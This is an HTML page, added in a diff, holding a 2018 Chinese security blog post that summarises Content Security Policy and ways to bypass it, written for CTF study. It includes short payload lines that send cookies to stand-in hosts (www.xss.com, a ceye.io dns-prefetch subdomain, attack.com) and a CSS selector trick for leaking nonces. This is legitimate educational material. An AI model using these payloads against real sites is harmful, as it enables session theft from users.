@@ -1,0 +1,509 @@
+
+ <!DOCTYPE HTML>
+<html >
+<head>
+  <meta charset="UTF-8">
+  
+    <title>CSP绕过总结 | 风之栖息地</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="hurricane618">
+    
+    <meta name="description" content="首发在信安之路上 https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ ，之后文章略有修改。
+CSP绕过总结今年的0CTF预选赛6道web题，其中三道都涉及CSP的知识点，简直可怕。。。这次趁着空闲时间就稍稍总结一下CSP绕过方面的知识，无论是对以后CT">
+    
+    
+    
+    
+    <link rel="alternate" href="/atom.xml" title="风之栖息地" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="风之栖息地" title="风之栖息地"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="风之栖息地">风之栖息地</a></h1>
+				<h2 class="blog-motto">habitat of gale</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:hurricane618.me">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2018/06/30/csp-bypass-summary/" title="CSP绕过总结" itemprop="url">CSP绕过总结</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="https://hurricane618.me" title="hurricane618">hurricane618</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2018-06-30T03:33:01.000Z" itemprop="datePublished">2018-06-30</time>
+    Updated:<time datetime="2018-06-30T04:58:02.091Z" itemprop="dateModified">2018-06-30</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP绕过总结"><span class="toc-number">1.</span> <span class="toc-text">CSP绕过总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP的基础"><span class="toc-number">1.1.</span> <span class="toc-text">CSP的基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP的进化–nonce-script-CSP和strict-dynamic"><span class="toc-number">1.2.</span> <span class="toc-text">CSP的进化–nonce script CSP和strict-dynamic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nonce-script-CSP"><span class="toc-number">1.2.1.</span> <span class="toc-text">nonce script CSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strict-dynamic"><span class="toc-number">1.2.2.</span> <span class="toc-text">strict-dynamic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Bypass的方法总结"><span class="toc-number">1.3.</span> <span class="toc-text">CSP Bypass的方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url跳转"><span class="toc-number">1.3.1.</span> <span class="toc-text">url跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-link-标签预加载"><span class="toc-number">1.3.2.</span> <span class="toc-text">\&lt;link&gt;标签预加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用浏览器补全"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用浏览器补全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用DOM-XSS"><span class="toc-number">1.3.4.</span> <span class="toc-text">利用DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用CSS-静态xss-获取nonce值"><span class="toc-number">1.3.5.</span> <span class="toc-text">利用CSS 静态xss 获取nonce值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用跨域传输数据"><span class="toc-number">1.3.6.</span> <span class="toc-text">利用跨域传输数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用文件上传执行JS"><span class="toc-number">1.3.7.</span> <span class="toc-text">利用文件上传执行JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base标签"><span class="toc-number">1.3.8.</span> <span class="toc-text">base标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">1.4.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+		</div>
+		
+		<p>首发在信安之路上 <a href="https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z_XmhrTUg_yUfkyAFFfaKQ</a> ，之后文章略有修改。</p>
+<h1 id="CSP绕过总结"><a href="#CSP绕过总结" class="headerlink" title="CSP绕过总结"></a>CSP绕过总结</h1><p>今年的0CTF预选赛6道web题，其中三道都涉及CSP的知识点，简直可怕。。。这次趁着空闲时间就稍稍总结一下CSP绕过方面的知识，无论是对以后CTF比赛还是工作都很有帮助。</p>
+<h2 id="CSP的基础"><a href="#CSP的基础" class="headerlink" title="CSP的基础"></a>CSP的基础</h2><p>CSP的全称Content Security Policy，用来防御XSS攻击的技术。它是一种由开发者定义的安全性政策性申明，通过CSP指定可信的内容来源，让WEB处于一个安全的运行环境中。</p>
+<p>一个CSP头由多组CSP策略组成，中间由分号分隔,如下所示：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' www.baidu.com; script-src 'unsafe-inline'</span><br></pre></td></tr></table></figure>
+<p>其中每一组策略包含一个策略指令和一个内容源列表。策略指令有如下选项：</p>
+<table>
+<thead>
+<tr>
+<th>指令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>default-src</td>
+<td>定义资源默认加载策略</td>
+</tr>
+<tr>
+<td>connect-src</td>
+<td>定义 Ajax、WebSocket 等加载策略</td>
+</tr>
+<tr>
+<td>font-src</td>
+<td>定义 Font 加载策略</td>
+</tr>
+<tr>
+<td>frame-src</td>
+<td>定义 Frame 加载策略</td>
+</tr>
+<tr>
+<td>img-src</td>
+<td>定义图片加载策略</td>
+</tr>
+<tr>
+<td>media-src</td>
+<td>定义 \&lt;audio>、\&lt;video> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>object-src</td>
+<td>定义 \&lt;applet>、\&lt;embed>、\&lt;object> 等引用资源加载策略</td>
+</tr>
+<tr>
+<td>script-src</td>
+<td>定义 JS 加载策略</td>
+</tr>
+<tr>
+<td>style-src</td>
+<td>定义 CSS 加载策略</td>
+</tr>
+<tr>
+<td>sandbox</td>
+<td>值为 allow-forms，对资源启用 sandbox</td>
+</tr>
+<tr>
+<td>report-uri</td>
+<td>值为 /report-uri，提交日志</td>
+</tr>
+</tbody>
+</table>
+<p>内容源有如下选项：</p>
+<table>
+<thead>
+<tr>
+<th>源</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>*</td>
+<td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td>
+</tr>
+<tr>
+<td>*.foo.com</td>
+<td>允许加载foo.com子域的资源</td>
+</tr>
+<tr>
+<td>abc.foo.com</td>
+<td>只能加载这个域名下的资源</td>
+</tr>
+<tr>
+<td><a href="https://a.com" target="_blank" rel="noopener">https://a.com</a></td>
+<td>只能用HTTPS加载域名下的资源</td>
+</tr>
+<tr>
+<td>https:</td>
+<td>通过HTTPS可以加载任意域名下的资源</td>
+</tr>
+<tr>
+<td>‘none’</td>
+<td>代表空集,即不匹配任何URL,两侧单引号是必须的</td>
+</tr>
+<tr>
+<td>‘self’</td>
+<td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td>
+</tr>
+<tr>
+<td>‘unsafe-inline’</td>
+<td>允许使用内联资源,如内联的\&lt;script>元素、javascript: URL、内联的事件处理函数和内联的\&lt;style>元素,两侧单引号是必须的</td>
+</tr>
+<tr>
+<td>‘unsafe-eval’</td>
+<td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td>
+</tr>
+<tr>
+<td>data:</td>
+<td>允许data: URI作为内容来源</td>
+</tr>
+<tr>
+<td>mediastream:</td>
+<td>允许mediastream: URI作为内容来源</td>
+</tr>
+</tbody>
+</table>
+<p>内容源有三种：源列表、关键字和数据，其中<em>，</em>.foo.com，abc.foo.com，<a href="https://a.com" target="_blank" rel="noopener">https://a.com</a> ，https:属于源列表。’none’，’self’，’unsafe-inline’，’unsafe-eval’属于关键字。data:，mediastream:属于数据。</p>
+<p>例子1</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self' trustedscripts.foo.com</span><br></pre></td></tr></table></figure>
+<p>意思就是默认的内容源必须为同源或者是 trustedscripts.foo.com</p>
+<p>例子2</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; img-src 'self' data:; media-src mediastream:</span><br></pre></td></tr></table></figure>
+<p>图片源可以为同源内容或者是data:引用的资源，媒体源必须使用mediastream:引用，除此以外的都执行默认内容源判断，必须为同源内容。更加详细的可以看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure>
+<p>一个在线的CSP头部生成器可以帮助我们深入理解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cspisawesome.com</span><br></pre></td></tr></table></figure>
+<p>一个CSP安全检测网站，能够提供一些参考</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://csp-evaluator.withgoogle.com/</span><br></pre></td></tr></table></figure>
+<h2 id="CSP的进化–nonce-script-CSP和strict-dynamic"><a href="#CSP的进化–nonce-script-CSP和strict-dynamic" class="headerlink" title="CSP的进化–nonce script CSP和strict-dynamic"></a>CSP的进化–nonce script CSP和strict-dynamic</h2><p>这是Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p>
+<h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p>
+<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure>
+<p>SD意味着可信js生成的js代码是可信的。</p>
+<p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p>
+<h2 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h2><p>CSP对前端攻击的防御主要有两个：</p>
+<ol>
+<li>限制js的执行。</li>
+<li>限制对不可信域的请求。</li>
+</ol>
+<p>接下来的多种Bypass手段也是围绕这两种的</p>
+<h3 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h3><p>利用url跳转，回避严格的CSP。</p>
+<p>在default-src ‘none’的情况下，可以使用meta标签实现跳转</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"1;url=http://www.xss.com/x.php?c=[cookie]"</span> &gt;</span></span><br></pre></td></tr></table></figure>
+<p>在允许unsafe-inline的情况下，可以用window.location，或者window.open之类的方法进行跳转绕过</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  window.location="http://www.xss.com/x.php?c=[cookie]";</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>\&lt;a>标签配合站内的某些可控JS点击操作来跳转</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  $(#foo).click()</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"foo"</span> <span class="attr">href</span>=<span class="string">"xxxxx.com"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>利用网站本身的跳转接口</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://foo.com/jmp.php?url=attack.com</span><br></pre></td></tr></table></figure>
+<h3 id="lt-link-标签预加载"><a href="#lt-link-标签预加载" class="headerlink" title="\&lt;link>标签预加载"></a>\&lt;link>标签预加载</h3><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"prefetch"</span> <span class="attr">href</span>=<span class="string">"http://www.xss.com/x.php?c=[cookie]"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"dns-prefetch"</span> <span class="attr">href</span>=<span class="string">"//[cookie].xxx.ceye.io"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>link标签除了这两种rel，还有preconnect、prerender、subresource、preload等</p>
+<h3 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h3><p>有些网站限制只有某些脚本才能使用，往往会使用\&lt;script>标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'none';script-src 'nonce-abc'</span><br></pre></td></tr></table></figure>
+<p>那么当脚本插入点为如下的情况时</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>插入点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以插入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"</span></span></span><br></pre></td></tr></table></figure>
+<p>这里利用浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attack.com</span> <span class="attr">a</span>=<span class="string">"&lt;/p&gt;</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;script"</span> <span class="attr">nonce</span>=<span class="string">"abc"</span>&gt;</span><span class="undefined">document.write('CSP');</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="利用DOM-XSS"><a href="#利用DOM-XSS" class="headerlink" title="利用DOM XSS"></a>利用DOM XSS</h3><p>如果JS存在操作location.hash导致的XSS，那么这样的攻击请求不会经过后台，那么nonce后的随机值就不会刷新。可以见下面lorexxar师傅的博文</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br></pre></td></tr></table></figure>
+<p>如果有DOM操作可以插入HTML并且可以控制插入的HTML内容，那么也可以绕过CSP</p>
+<h3 id="利用CSS-静态xss-获取nonce值"><a href="#利用CSS-静态xss-获取nonce值" class="headerlink" title="利用CSS 静态xss 获取nonce值"></a>利用CSS 静态xss 获取nonce值</h3><p>利用CSS选择器来逐字节获取信息，^=从头部判断</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="a"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=a"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="b"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=b"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="c"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=c"</span>)&#125;</span><br></pre></td></tr></table></figure>
+<p>比如确定第一位为c，那么就会继续下面的步骤</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*<span class="selector-attr">[attribute^="ca"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=ca"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cb"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cb"</span>)&#125;</span><br><span class="line">*<span class="selector-attr">[attribute^="cc"]</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"record?match=cc"</span>)&#125;</span><br></pre></td></tr></table></figure>
+<p>由于是CSS的变化，没有引起服务器重新请求，所以nonce的值不会改变，偷取值后即可执行我们的script</p>
+<h3 id="利用跨域传输数据"><a href="#利用跨域传输数据" class="headerlink" title="利用跨域传输数据"></a>利用跨域传输数据</h3><p>利用一些跨域传输的方法来引入JS，导致执行</p>
+<p>具体的可以看看呆子不开口的乌云大会PPT</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pan.baidu.com/s/1pLCfCWr</span><br></pre></td></tr></table></figure>
+<p>和0CTF2018预选赛中的h4xors.club2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2018/04/10/0ctf2018-club2/</span><br></pre></td></tr></table></figure>
+<h3 id="利用文件上传执行JS"><a href="#利用文件上传执行JS" class="headerlink" title="利用文件上传执行JS"></a>利用文件上传执行JS</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'self'</span><br></pre></td></tr></table></figure>
+<p>针对只能加载同域下script的CSP策略，如果有上传点可以控制，那么可以在其中夹杂js代码，然后引用该文件完成执行。</p>
+<p>可以参考前几天梅子酒师傅写的上传Wave文件绕过CSP，执行JS</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s/ljBB5jStB7fcJq4cgdWnnw</span><br></pre></td></tr></table></figure>
+<h3 id="base标签"><a href="#base标签" class="headerlink" title="base标签"></a>base标签</h3><p>利用base标签改变资源加载的域，从而引入恶意的js，造成js执行</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>可以看到CSP的绕过比较看重实际场景，不同的情况下有着不同的绕过方法。</p>
+<p>作者能力有限，如果文章中有什么问题，欢迎交流。最后，恭喜RNG！</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">https://lorexxar.cn/2017/05/09/CSP%20Is%20Dead,%20Long%20Live%20CSP!%20On%20the%20Insecurity%20of%20Whitelists%20and%20the%20Future%20of%20Content%20Security%20Policy/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/10/25/csp-paper/#0x02-CSP%EF%BC%88Content-Security-Policy%EF%BC%89</span><br><span class="line"></span><br><span class="line">https://www.jianshu.com/p/f1de775bc43e</span><br><span class="line"></span><br><span class="line">https://paper.seebug.org/91/</span><br><span class="line"></span><br><span class="line">http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</span><br><span class="line"></span><br><span class="line">https://lorexxar.cn/2016/08/08/ccsp/</span><br></pre></td></tr></table></figure>  
+	</div>
+		<footer class="article-footer clearfix">
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/CSP/">CSP</a>
+  </div>
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/技术/">技术</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="https://hurricane618.me/2018/06/30/csp-bypass-summary/" data-title="CSP绕过总结 | 风之栖息地" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+
+<div class="next">
+<a href="/2018/06/26/new-start/"  title="新的开始">
+ <strong>NEXT:</strong><br/> 
+ <span>新的开始
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP绕过总结"><span class="toc-number">1.</span> <span class="toc-text">CSP绕过总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP的基础"><span class="toc-number">1.1.</span> <span class="toc-text">CSP的基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP的进化–nonce-script-CSP和strict-dynamic"><span class="toc-number">1.2.</span> <span class="toc-text">CSP的进化–nonce script CSP和strict-dynamic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nonce-script-CSP"><span class="toc-number">1.2.1.</span> <span class="toc-text">nonce script CSP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strict-dynamic"><span class="toc-number">1.2.2.</span> <span class="toc-text">strict-dynamic</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP-Bypass的方法总结"><span class="toc-number">1.3.</span> <span class="toc-text">CSP Bypass的方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#url跳转"><span class="toc-number">1.3.1.</span> <span class="toc-text">url跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lt-link-标签预加载"><span class="toc-number">1.3.2.</span> <span class="toc-text">\&lt;link&gt;标签预加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用浏览器补全"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用浏览器补全</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用DOM-XSS"><span class="toc-number">1.3.4.</span> <span class="toc-text">利用DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用CSS-静态xss-获取nonce值"><span class="toc-number">1.3.5.</span> <span class="toc-text">利用CSS 静态xss 获取nonce值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用跨域传输数据"><span class="toc-number">1.3.6.</span> <span class="toc-text">利用跨域传输数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用文件上传执行JS"><span class="toc-number">1.3.7.</span> <span class="toc-text">利用文件上传执行JS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base标签"><span class="toc-number">1.3.8.</span> <span class="toc-text">base标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#结语"><span class="toc-number">1.4.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/技术/" title="技术">技术<sup>1</sup></a></li>
+		
+			<li><a href="/categories/杂谈/" title="杂谈">杂谈<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			<li><a href="/tags/CSP/" title="CSP">CSP<sup>1</sup></a></li>
+		
+			<li><a href="/tags/闲聊/" title="闲聊">闲聊<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+  <div class="archiveslist">
+    <p class="asidetitle"><a href="/archives">Archives</a></p>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a><span class="archive-list-count">2</span></li></ul>
+  </div>
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> 愿风指引你的道路 <br/>
+			May the wind guide you</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		<a href="https://github.com/hurricane618" target="_blank" title="github"></a>
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2018 
+		
+		<a href="https://hurricane618.me" target="_blank" title="hurricane618">hurricane618</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
